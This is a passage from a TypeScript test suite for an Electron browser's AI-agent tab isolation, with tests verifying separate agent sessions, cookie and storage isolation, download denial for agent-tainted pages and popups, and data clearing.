        const contents = registry.target(tabId)
        const prototype = Object.getPrototypeOf(contents) as {
          loadURL: (url: string) => Promise<void>
        }
        const originalLoad = prototype.loadURL
        let stagedContents: Electron.WebContents | null = null
        const url = 'https://example.org/'
        let issued!: () => void
        let finishLoad!: () => void
        const started = new Promise<void>((resolve) => {
          issued = resolve
        })
        const loading = new Promise<void>((resolve) => {
          finishLoad = resolve
        })
        prototype.loadURL = function (this: Electron.WebContents) {
          stagedContents = this
          issued()
          return loading
        }
        const invalidations: string[] = []
        const unsubscribe = registry.onAgentTargetInvalidated((_tabId, kind) =>
          invalidations.push(kind)
        )
        const navigation = registry.agentNavigate(tabId, url, 'https://example.org').then(
          () => 'succeeded',
          (error) => (error as Error).message
        )
        await started
        const details = {
          url,
          isSameDocument: false,
          isMainFrame: true,
          frame: null,
          initiator: null,
        } as Electron.WebContentsDidStartNavigationEventParams
        stagedContents!.emit('did-start-navigation', details)
        stagedContents!.emit('did-start-navigation', details)
        finishLoad()
        const outcome = await navigation
        prototype.loadURL = originalLoad
        unsubscribe()
        return { invalidations, outcome }
      })
      assert.deepEqual(result, {
        invalidations: ['target', 'external'],
        outcome: 'navigation_outcome_unknown',
      })
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'Agent-owned debugger release only invalidates its read target; external detach revokes',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-agent-debugger-release-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const tabId = registry.snapshot().activeTabId!
        const invalidations: string[] = []
        const unsubscribe = registry.onAgentTargetInvalidated((_tabId, kind) =>
          invalidations.push(kind)
        )
        const contents = registry.attach(tabId)
        const continuities: Array<{
          instanceId: string
          previousGeneration: number
          generation: number
        } | null> = []
        const detach = registry.onDebuggerDetach(
          (
            _tabId,
            _reason,
            continuity?: {
              instanceId: string
              previousGeneration: number
              generation: number
            }
          ) => continuities.push(continuity ?? null)
        )
        registry.detachAgent(tabId)
        await new Promise<void>((resolve) => setImmediate(resolve))
        registry.attach(tabId)
        contents.debugger.detach()
        await new Promise<void>((resolve) => setImmediate(resolve))
        unsubscribe()
        detach()
        return { invalidations, continuities }
      })
      assert.deepEqual(result.invalidations, ['target', 'external'])
      assert.equal(result.continuities.length, 2)
      assert.ok(result.continuities[0])
      assert.equal(typeof result.continuities[0].instanceId, 'string')
      assert.ok(Number.isSafeInteger(result.continuities[0].previousGeneration))
      assert.equal(result.continuities[0].generation, result.continuities[0].previousGeneration + 1)
      assert.equal(result.continuities[1], null)
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'Agent download handoff never succeeds or escapes its issued-load fence',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-agent-download-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const outcomes = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        const cases = [
          { name: 'same-origin', urls: ['https://example.org/file'], cancel: false },
          {
            name: 'cross-origin',
            urls: ['https://example.org/file', 'https://cdn.example.org/file'],
            cancel: false,
          },
          {
            name: 'source-denied',
            urls: ['https://example.org/file', 'http://127.0.0.1/private'],
            cancel: false,
          },
          { name: 'cancelled', urls: ['https://example.org/file'], cancel: true },
        ]
        const observed = []
        const sampleContents = registry.target(
          (await registry.dispatch({ kind: 'open' })).activeTabId!
        )
        const prototype = Object.getPrototypeOf(sampleContents) as {
          loadURL: (url: string) => Promise<void>
        }
        const originalLoad = prototype.loadURL
        for (const scenario of cases) {
          await registry.dispatch({ kind: 'open' })
          const tabId = registry.snapshot().activeTabId!
          let stagedContents: Electron.WebContents | null = null
          let issued!: () => void
          let finishLoad!: () => void
          const started = new Promise<void>((resolve) => {
            issued = resolve
          })
          const loading = new Promise<void>((resolve) => {
            finishLoad = resolve
          })
          prototype.loadURL = function (this: Electron.WebContents) {
            stagedContents = this
            Object.defineProperty(this, 'isLoadingMainFrame', {
              value: () => false,
              configurable: true,
            })
            issued()
            return loading
          }
          const navigation = registry
            .agentNavigate(tabId, 'https://example.org/file', 'https://example.org')
            .then(
              () => 'succeeded',
              (error) => (error as Error).message
            )
          const startState = await Promise.race([
            started.then(() => 'started'),
            new Promise<'start_timeout'>((resolve) =>
              setTimeout(() => resolve('start_timeout'), 1_000)
            ),
          ])
          if (startState !== 'started') return { error: startState, scenario: scenario.name }
          Object.defineProperty(stagedContents!, 'getURL', {
            value: () => 'https://example.org/page',
          })
          if (scenario.cancel) registry.cancelAgentNavigation(tabId)
          let prevented = false
          let saveDialog = false
          const event = {
            preventDefault: () => {
              prevented = true
            },
          } as Electron.Event
          const item = {
            getURLChain: () => scenario.urls,
            getURL: () => scenario.urls.at(-1)!,
            getFilename: () => 'file.txt',
            setSaveDialogOptions: () => {
              saveDialog = true
            },
          } as unknown as Electron.DownloadItem
          stagedContents!.session.emit('will-download', event, item, stagedContents!)
          const beforeTerminal = await Promise.race([
            navigation.then(() => 'settled'),
            new Promise<'pending'>((resolve) => setTimeout(() => resolve('pending'), 100)),
          ])
          finishLoad()
          const outcome = await Promise.race([
            navigation,
            new Promise<'navigation_timeout'>((resolve) =>
              setTimeout(() => resolve('navigation_timeout'), 1_000)
            ),
          ])
          if (outcome === 'navigation_timeout')
            return {
              error: outcome,
              scenario: scenario.name,
              prevented,
              saveDialog,
              beforeTerminal,
            }
          observed.push({ name: scenario.name, prevented, saveDialog, beforeTerminal, outcome })
          await registry.dispatch({ kind: 'close', tabId })
        }
        prototype.loadURL = originalLoad
        return observed
      })
      assert.deepEqual(outcomes, [
        {
          name: 'same-origin',
          prevented: true,
          saveDialog: false,
          beforeTerminal: 'pending',
          outcome: 'navigation_outcome_unknown',
        },
        {
          name: 'cross-origin',
          prevented: true,
          saveDialog: false,
          beforeTerminal: 'pending',
          outcome: 'navigation_outcome_unknown',
        },
        {
          name: 'source-denied',
          prevented: true,
          saveDialog: false,
          beforeTerminal: 'pending',
          outcome: 'navigation_outcome_unknown',
        },
        {
          name: 'cancelled',
          prevented: true,
          saveDialog: false,
          beforeTerminal: 'pending',
          outcome: 'navigation_outcome_unknown',
        },
      ])
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'Agent Session denies delayed downloads after manual navigation swaps back to public Session',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-agent-delayed-download-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const tabId = registry.snapshot().activeTabId!
        const originalContents = registry.target(tabId)
        const originalSession = originalContents.session
        const pageUrl = 'https://example.org/page'
        const prototype = Object.getPrototypeOf(originalContents) as {
          loadURL: (url: string) => Promise<void>
        }
        const originalLoad = prototype.loadURL
        prototype.loadURL = async function (this: Electron.WebContents, url: string) {
          Object.defineProperty(this, 'getURL', { value: () => url, configurable: true })
          this.emit('did-navigate', {} as Electron.Event, url, 200)
          this.emit('dom-ready')
        }
        await registry.agentNavigate(tabId, pageUrl, 'https://example.org')
        const agentContents = registry.target(tabId)
        const agentSession = agentContents.session
        const download = (
          contents: Electron.WebContents,
          owningSession: Electron.Session = contents.session
        ) => {
          let prevented = false
          let saveDialog = false
          const event = {
            preventDefault: () => {
              prevented = true
            },
          } as Electron.Event
          const item = (globalThis as unknown as BrowserFixture).downloadItem(
            'blob:https://example.org/file',
            () => {
              saveDialog = true
            }
          )
          owningSession.emit('will-download', event, item, contents)
          return { prevented, saveDialog }
        }
        const delayed = download(agentContents)
        prototype.loadURL = async () => {
          throw new Error('unreachable')
        }
        let failedNavigation = false
        try {
          await registry.dispatch({ kind: 'navigate', tabId, input: pageUrl })
        } catch {
          failedNavigation = true
        }
        const afterFailedUserNavigation = download(agentContents)
        prototype.loadURL = async function (this: Electron.WebContents, url: string) {
          Object.defineProperty(this, 'getURL', { value: () => url, configurable: true })
          this.emit('did-navigate', {} as Electron.Event, url, 200)
          this.emit('dom-ready')
        }
        await registry.dispatch({ kind: 'navigate', tabId, input: pageUrl })
        const manualContents = registry.target(tabId)
        const afterUserNavigation = download(manualContents)
        const staleAgentDownload = download(agentContents, agentSession)
        prototype.loadURL = originalLoad
        return {
          delayed,
          failedNavigation,
          afterFailedUserNavigation,
          afterUserNavigation,
          staleAgentDownload,
          swapped: manualContents !== agentContents,
          restoredSession: manualContents.session === originalSession,
        }
      })
      assert.deepEqual(result, {
        delayed: { prevented: true, saveDialog: false },
        failedNavigation: true,
        afterFailedUserNavigation: { prevented: true, saveDialog: false },
        afterUserNavigation: { prevented: false, saveDialog: true },
        staleAgentDownload: { prevented: true, saveDialog: false },
        swapped: true,
        restoredSession: true,
      })
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'a popup opened by an Agent-tainted page inherits the download denial',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-agent-popup-download-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const source = registry.target(registry.snapshot().activeTabId!)
        const sourceUrl = 'https://example.org/page'
        const prototype = Object.getPrototypeOf(source) as {
          setWindowOpenHandler: (handler: (details: { url: string }) => unknown) => void
          loadURL: (url: string) => Promise<void>
        }
        const originalHandler = prototype.setWindowOpenHandler
        const originalLoad = prototype.loadURL
        let popupHandler: ((details: { url: string }) => unknown) | null = null
        prototype.setWindowOpenHandler = function (
          this: Electron.WebContents,
          handler: (details: { url: string }) => unknown
        ) {
          popupHandler = handler
          return originalHandler.call(this, handler)
        }
        prototype.loadURL = async function (this: Electron.WebContents, url: string) {
          Object.defineProperty(this, 'getURL', { value: () => url, configurable: true })
          this.emit('did-navigate', {} as Electron.Event, url, 200)
          this.emit('dom-ready')
        }
        try {
          popupHandler = null
          await registry.dispatch({ kind: 'open' })
          const popupSourceId = registry.snapshot().activeTabId!
          const popupSource = registry.target(popupSourceId)
          Object.defineProperty(popupSource, 'loadURL', {
            value: async (url: string) => {
              Object.defineProperty(popupSource, 'getURL', { value: () => url, configurable: true })
              popupSource.emit('did-navigate', {} as Electron.Event, url, 200)
              popupSource.emit('dom-ready')
            },
          })
          await registry.agentNavigate(popupSourceId, sourceUrl, 'https://example.org')
          const activeSource = registry.target(popupSourceId)
          await activeSource.session.cookies.set({
            url: sourceUrl,
            name: 'agent-login',
            value: 'session',
          })
          const handler = popupHandler as ((details: { url: string }) => unknown) | null
          if (!handler) throw new Error('popup_handler_missing')
          handler({ url: 'https://example.org/file' })
          for (
            let attempt = 0;
            attempt < 100 && registry.snapshot().tabs.length < 3;
            attempt += 1
          ) {
            await new Promise((resolve) => setTimeout(resolve, 10))
          }
          const childId = registry.snapshot().activeTabId!
          const child = registry.target(childId)
          let prevented = false
          let saveDialog = false
          const event = {
            preventDefault: () => {
              prevented = true
            },
          } as Electron.Event
          const item = (globalThis as unknown as BrowserFixture).downloadItem(
            'https://example.org/file',
            () => {
              saveDialog = true
            }
          )
          child.session.emit('will-download', event, item, child)
          const childCookies = await child.session.cookies.get({ url: sourceUrl })
          const sharedSession = child.session === activeSource.session
          await registry.dispatch({ kind: 'close', tabId: childId })
          const parentCookiesAfterChildClose = await activeSource.session.cookies.get({
            url: sourceUrl,
          })
          return {
            popupCreated: childId !== popupSourceId,
            sharedSession,
            childCookies: childCookies.map((cookie) => cookie.name),
            parentCookiesAfterChildClose: parentCookiesAfterChildClose.map((cookie) => cookie.name),
            prevented,
            saveDialog,
          }
        } finally {
          prototype.setWindowOpenHandler = originalHandler
          prototype.loadURL = originalLoad
        }
      })
      assert.deepEqual(result, {
        popupCreated: true,
        sharedSession: true,
        childCookies: ['agent-login'],
        parentCookiesAfterChildClose: ['agent-login'],
        prevented: true,
        saveDialog: false,
      })
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'consecutive Agent navigations retain isolated cookies and localStorage without sharing manual state',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-agent-continuity-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const manualId = registry.snapshot().activeTabId!
        const manualContents = registry.target(manualId)
        await manualContents.session.cookies.set({
          url: 'https://example.org/',
          name: 'manual-login',
          value: 'private',
        })
        await registry.dispatch({ kind: 'open' })
        const agentId = registry.snapshot().activeTabId!
        const initialContents = registry.target(agentId)
        const prototype = Object.getPrototypeOf(initialContents) as {
          loadURL: (url: string) => Promise<void>
        }
        const originalLoad = prototype.loadURL
        prototype.loadURL = async function (this: Electron.WebContents, url: string) {
          Object.defineProperty(this, 'getURL', { value: () => url, configurable: true })
          this.emit('did-navigate', {} as Electron.Event, url, 200)
          this.emit('dom-ready')
        }
        try {
          await registry.agentNavigate(agentId, 'https://example.org/first', 'https://example.org')
          const first = registry.target(agentId)
          const agentSession = first.session
          await agentSession.cookies.set({
            url: 'https://example.org/',
            name: 'agent-login',
            value: 'isolated',
          })
          await registry.agentNavigate(agentId, 'https://example.org/second', 'https://example.org')
          const second = registry.target(agentId)
          if (second.session !== agentSession) return { shared: false }
          const secondCookies = await second.session.cookies.get({ url: 'https://example.org/' })
          prototype.loadURL = async () => {
            throw new Error('simulated load failure')
          }
          const failed = await registry
            .agentNavigate(agentId, 'https://example.org/failure', 'https://example.org')
            .then(
              () => 'succeeded',
              (error) => (error as Error).message
            )
          const retainedAfterFailure = registry.target(agentId).session === agentSession
          prototype.loadURL = originalLoad
          second.session.protocol.handle(
            'https',
            () =>
              new Response('<title>Agent continuity</title>', {
                headers: { 'content-type': 'text/html' },
              })
          )
          await registry.agentNavigate(
            agentId,
            'https://example.org/storage',
            'https://example.org'
          )
          const storagePage = registry.target(agentId)
          await storagePage.executeJavaScript("localStorage.setItem('agent-token', 'retained')")
          await registry.agentNavigate(agentId, 'https://example.org/check', 'https://example.org')
          const finalPage = registry.target(agentId)
          const localValue = await finalPage.executeJavaScript(
            "localStorage.getItem('agent-token')"
          )
          const manualCookies = await manualContents.session.cookies.get({
            url: 'https://example.org/',
          })
          return {
            shared: finalPage.session === agentSession,
            agentCookies: secondCookies.map((cookie) => cookie.name),
            manualCookies: manualCookies.map((cookie) => cookie.name),
            failed,
            retainedAfterFailure,
            localValue,
          }
        } finally {
          prototype.loadURL = originalLoad
        }
      })
      assert.deepEqual(result, {
        shared: true,
        agentCookies: ['agent-login'],
        manualCookies: ['manual-login'],
        failed: 'navigation_outcome_unknown',
        retainedAfterFailure: true,
        localValue: 'retained',
      })
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'Agent navigation stages an isolated Session without blocking existing manual tabs',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-agent-session-download-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const manualTabId = registry.snapshot().activeTabId!
        const manualContents = registry.target(manualTabId)
        const pageUrl = 'https://example.org/page'
        Object.defineProperty(manualContents, 'loadURL', {
          value: async (url: string) => {
            Object.defineProperty(manualContents, 'getURL', {
              value: () => url,
              configurable: true,
            })
            manualContents.emit('did-navigate', {} as Electron.Event, url, 200)
            manualContents.emit('dom-ready')
          },
        })
        await registry.dispatch({ kind: 'navigate', tabId: manualTabId, input: pageUrl })
        await manualContents.session.cookies.set({
          url: pageUrl,
          name: 'manual-only',
          value: 'private',
        })
        await registry.dispatch({ kind: 'open' })
        const agentTabId = registry.snapshot().activeTabId!
        const originalAgentContents = registry.target(agentTabId)
        const prototype = Object.getPrototypeOf(originalAgentContents) as {
          loadURL: (url: string) => Promise<void>
        }
        const originalLoad = prototype.loadURL
        prototype.loadURL = async function (this: Electron.WebContents, url: string) {
          Object.defineProperty(this, 'getURL', { value: () => url, configurable: true })
          this.emit('did-navigate', {} as Electron.Event, url, 200)
          this.emit('dom-ready')
        }
        await registry.dispatch({ kind: 'navigate', tabId: agentTabId, input: pageUrl })
        const originalInstance = registry.agentTarget(agentTabId).instanceId
        try {
          await registry.agentNavigate(agentTabId, pageUrl, 'https://example.org')
        } finally {
          prototype.loadURL = originalLoad
        }
        const agentContents = registry.target(agentTabId)
        const isolatedCookies = await agentContents.session.cookies.get({ url: pageUrl })
        const attemptDownload = () => {
          let prevented = false
          let saveDialog = false
          const event = {
            preventDefault: () => {
              prevented = true
            },
          } as Electron.Event
          const item = (globalThis as unknown as BrowserFixture).downloadItem(
            'https://example.org/file',
            () => {
              saveDialog = true
            }
          )
          manualContents.session.emit('will-download', event, item, manualContents)
          return { prevented, saveDialog }
        }
        const afterAgentNavigation = attemptDownload()
        await registry.dispatch({ kind: 'navigate', tabId: manualTabId, input: pageUrl })
        const afterManualNavigation = attemptDownload()
        return {
          sharedSession: manualContents.session === agentContents.session,
          swappedContents: originalAgentContents !== agentContents,
          swappedInstance: originalInstance !== registry.agentTarget(agentTabId).instanceId,
          isolatedCookies: isolatedCookies.length,
          afterAgentNavigation,
          afterManualNavigation,
        }
      })
      assert.deepEqual(result, {
        sharedSession: false,
        swappedContents: true,
        swappedInstance: true,
        isolatedCookies: 0,
        afterAgentNavigation: { prevented: false, saveDialog: true },
        afterManualNavigation: { prevented: false, saveDialog: true },
      })
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'Agent isolated Session does not affect the isolated local API Session',
  { timeout: 30_000 },
  async () => {
    const fixture = createServer((_request, response) => response.end('<title>Local page</title>'))
    fixture.listen(0, '127.0.0.1')
    await once(fixture, 'listening')
    const address = fixture.address()
    assert.ok(address && typeof address !== 'string')
    const origin = `http://127.0.0.1:${address.port}`
    const temporary = await mkdtemp(join(tmpdir(), 'browser-agent-local-download-'))
    const application = await launchRegistryProbe(origin, temporary)
    try {
      const result = await application.evaluate(async (_electron, localOrigin) => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open', input: localOrigin })
        const localId = registry.snapshot().activeTabId!
        const localContents = registry.target(localId)
        await registry.dispatch({ kind: 'open' })
        const agentId = registry.snapshot().activeTabId!
        const agentContents = registry.target(agentId)
        const prototype = Object.getPrototypeOf(agentContents) as {
          loadURL: (url: string) => Promise<void>
        }
        const originalLoad = prototype.loadURL
        prototype.loadURL = async function (this: Electron.WebContents, url: string) {
          Object.defineProperty(this, 'getURL', { value: () => url, configurable: true })
          this.emit('did-navigate', {} as Electron.Event, url, 200)
          this.emit('dom-ready')
        }
        await registry.agentNavigate(agentId, 'https://example.org/page', 'https://example.org')
        prototype.loadURL = originalLoad
        const isolatedAgentContents = registry.target(agentId)
        let prevented = false
        let saveDialog = false
        const event = {
          preventDefault: () => {
            prevented = true
          },
        } as Electron.Event
        const item = (globalThis as unknown as BrowserFixture).downloadItem(
          `${localOrigin}/file`,
          () => {
            saveDialog = true
          }
        )
        localContents.session.emit('will-download', event, item, localContents)
        return {
          separateSession: localContents.session !== isolatedAgentContents.session,
          prevented,
          saveDialog,
        }
      }, origin)
      assert.deepEqual(result, { separateSession: true, prevented: false, saveDialog: true })
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
      await new Promise<void>((resolve) => fixture.close(() => resolve()))
    }
  }
)

test(
  'clear-all closes Agent-isolated tabs and retains their download denial',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-agent-clear-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const tabId = registry.snapshot().activeTabId!
        const contents = registry.target(tabId)
        const prototype = Object.getPrototypeOf(contents) as {
          loadURL: (url: string) => Promise<void>
        }
        const originalLoad = prototype.loadURL
        prototype.loadURL = async function (this: Electron.WebContents, url: string) {
          Object.defineProperty(this, 'getURL', { value: () => url, configurable: true })
          this.emit('did-navigate', {} as Electron.Event, url, 200)
          this.emit('dom-ready')
        }
        await registry.agentNavigate(tabId, 'https://example.org/page', 'https://example.org')
        prototype.loadURL = originalLoad
        const agentContents = registry.target(tabId)
        const agentSession = agentContents.session
        await registry.clearData({ kind: 'clear-all' })
        let prevented = false
        const event = {
          preventDefault: () => {
            prevented = true
          },
        } as Electron.Event
        const item = {
          getURLChain: () => ['https://example.org/file'],
          getURL: () => 'https://example.org/file',
          getFilename: () => 'file.txt',
          setSaveDialogOptions() {},
        } as unknown as Electron.DownloadItem
        agentSession.emit('will-download', event, item, agentContents)
        return {
          tabs: registry.snapshot().tabs.length,
          destroyed: agentContents.isDestroyed(),
          prevented,
        }
      })
      assert.deepEqual(result, { tabs: 0, destroyed: true, prevented: true })
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'site-data clearing leaves both unrelated Agent private sessions intact',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-agent-site-clear-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const initial = registry.target(registry.snapshot().activeTabId!)
        const prototype = Object.getPrototypeOf(initial) as {
          loadURL: (url: string) => Promise<void>
        }
        const originalLoad = prototype.loadURL
        prototype.loadURL = async function (this: Electron.WebContents, url: string) {
          Object.defineProperty(this, 'getURL', { value: () => url, configurable: true })
          this.emit('did-navigate', {} as Electron.Event, url, 200)
          this.emit('dom-ready')
        }
        let firstId: string
        let secondId: string
        try {
          firstId = registry.snapshot().activeTabId!
          await registry.agentNavigate(firstId, 'https://example.org/page', 'https://example.org')
          await registry.dispatch({ kind: 'open' })
          secondId = registry.snapshot().activeTabId!
          await registry.agentNavigate(secondId, 'https://example.net/page', 'https://example.net')
        } finally {
          prototype.loadURL = originalLoad
        }
        const firstContents = registry.target(firstId!)
        const secondContents = registry.target(secondId!)
        const firstSession = firstContents.session
        const secondSession = secondContents.session
        await firstSession.cookies.set({
          url: 'https://example.org/',
          name: 'first-agent',
          value: 'retained',
        })
        await secondSession.cookies.set({
          url: 'https://example.net/',
          name: 'second-agent',
          value: 'retained',
        })
        await registry.dispatch({ kind: 'open' })
        const persistentId = registry.snapshot().activeTabId!
        const persistentContents = registry.target(persistentId)
        const persistentSession = persistentContents.session
        await persistentSession.cookies.set({
          url: 'https://example.org/',
          name: 'persistent-site',
          value: 'clear',
        })
        await registry.clearData({ kind: 'clear-site-data', origin: 'https://example.org' })
        return {
          tabs: registry.snapshot().tabs.map((tab) => tab.tabId),
          firstId,
          secondId,
          firstSessionSame: registry.target(firstId!).session === firstSession,
          secondSessionSame: registry.target(secondId!).session === secondSession,
          firstCookies: await firstSession.cookies.get({ url: 'https://example.org/' }),
          secondCookies: await secondSession.cookies.get({ url: 'https://example.net/' }),
          persistentCookies: await persistentSession.cookies.get({ url: 'https://example.org/' }),
          persistentDestroyed: persistentContents.isDestroyed(),
        }
      })
      assert.deepEqual(result.tabs, [result.firstId, result.secondId])
      assert.equal(result.firstSessionSame, true)
      assert.equal(result.secondSessionSame, true)
      assert.equal(
        result.firstCookies.some((cookie) => cookie.name === 'first-agent'),
        true
      )
      assert.equal(
        result.secondCookies.some((cookie) => cookie.name === 'second-agent'),
        true
      )
      assert.equal(
        result.persistentCookies.some((cookie) => cookie.name === 'persistent-site'),
        false
      )
      assert.equal(result.persistentDestroyed, true)
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'Agent download blocking is process-local and resets with a new browser Session',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-agent-session-reset-'))
    const first = await launchRegistryProbe('', temporary)
    try {
      const blocked = await first.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const tabId = registry.snapshot().activeTabId!
        const contents = registry.target(tabId)
        const prototype = Object.getPrototypeOf(contents) as {
          loadURL: (url: string) => Promise<void>
        }
        const originalLoad = prototype.loadURL
        prototype.loadURL = async function (this: Electron.WebContents, url: string) {
          Object.defineProperty(this, 'getURL', { value: () => url, configurable: true })
          this.emit('did-navigate', {} as Electron.Event, url, 200)
          this.emit('dom-ready')
        }
        await registry.agentNavigate(tabId, 'https://example.org/page', 'https://example.org')
        prototype.loadURL = originalLoad
        const isolatedContents = registry.target(tabId)
        let prevented = false
        const event = {
          preventDefault: () => {
            prevented = true
          },
        } as Electron.Event
        const item = {
          getURLChain: () => ['https://example.org/file'],
          getURL: () => 'https://example.org/file',
          getFilename: () => 'file.txt',
          setSaveDialogOptions() {},
        } as unknown as Electron.DownloadItem
        isolatedContents.session.emit('will-download', event, item, isolatedContents)
        return prevented
      })
      assert.equal(blocked, true)
    } finally {
      await first.close()
    }
    const second = await launchRegistryProbe('', temporary)
    try {
      const restored = await second.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const tabId = registry.snapshot().activeTabId!
        const contents = registry.target(tabId)
        Object.defineProperty(contents, 'loadURL', {
          value: async (url: string) => {
            Object.defineProperty(contents, 'getURL', { value: () => url, configurable: true })
            contents.emit('did-navigate', {} as Electron.Event, url, 200)
            contents.emit('dom-ready')
          },
        })
        await registry.dispatch({ kind: 'navigate', tabId, input: 'https://example.org/page' })
        let prevented = false
        let saveDialog = false
        const event = {
          preventDefault: () => {
            prevented = true
          },
        } as Electron.Event
        const item = (globalThis as unknown as BrowserFixture).downloadItem(
          'https://example.org/file',
          () => {
            saveDialog = true
          }
        )
        contents.session.emit('will-download', event, item, contents)
        return { prevented, saveDialog }
      })
      assert.deepEqual(restored, { prevented: false, saveDialog: true })
    } finally {
      await second.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'native browser bounds follow renderer zoom and window minimization without destroying tabs',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-geometry-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry, browserWindow } = globalThis as unknown as BrowserFixture
        await browserWindow.loadURL('about:blank')
        browserWindow.show()
        await registry.dispatch({ kind: 'open' })
        const tabId = registry.snapshot().activeTabId!
        browserWindow.webContents.setZoomFactor(1.25)
        await registry.dispatch({
          kind: 'bounds',
          tabId,
          visible: true,
          x: 20,
          y: 40,
          width: 100,
          height: 80,
        })
        const view = browserWindow.contentView.children[0] as WebContentsView
        const zoomed = view.getBounds()
        const minimized = new Promise<void>((resolve) =>
          browserWindow.once('minimize', () => resolve())
        )
        browserWindow.minimize()
        await minimized
        const hidden = !view.getVisible()
        browserWindow.restore()
        await registry.dispatch({
          kind: 'bounds',
          tabId,
          visible: false,
          x: 20,
          y: 40,
          width: 100,
          height: 80,
        })
        return {
          zoomed,
          hidden,
          tabs: registry.snapshot().tabs.length,
          inactive: !view.getVisible(),
        }
      })
      assert.deepEqual(result.zoomed, { x: 25, y: 50, width: 125, height: 100 })
      assert.equal(result.hidden, true)
      assert.equal(result.inactive, true)
      assert.equal(result.tabs, 1)
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'browser history follows product home while its persistent Session is isolated from the default Session',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-profile-home-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const storage = await application.evaluate(async ({ session }) => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        return {
          browser: registry.target(registry.snapshot().activeTabId!).session.storagePath,
          default: session.defaultSession.storagePath,
        }
      })
      assert.ok(storage.browser?.startsWith(join(temporary, 'sessionData', 'Partitions')))
      assert.notEqual(storage.browser, storage.default)
      assert.equal(existsSync(join(temporary, 'home', 'browser', 'history.sqlite3')), true)
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'fresh browser partition persists cookies across restart without leaking between product homes',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-profile-fresh-'))
    const browserHome = join(temporary, 'home', 'browser')
    let application: Awaited<ReturnType<typeof _electron.launch>> | undefined
    try {
      assert.equal(existsSync(browserHome), false)
      application = await launchRegistryProbe('', temporary)
      const first = await application.evaluate(async ({ session }) => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const browserSession = registry.target(registry.snapshot().activeTabId!).session
        await browserSession.cookies.set({
          url: 'https://example.org/',
          name: 'profile-probe',
          value: 'persisted',
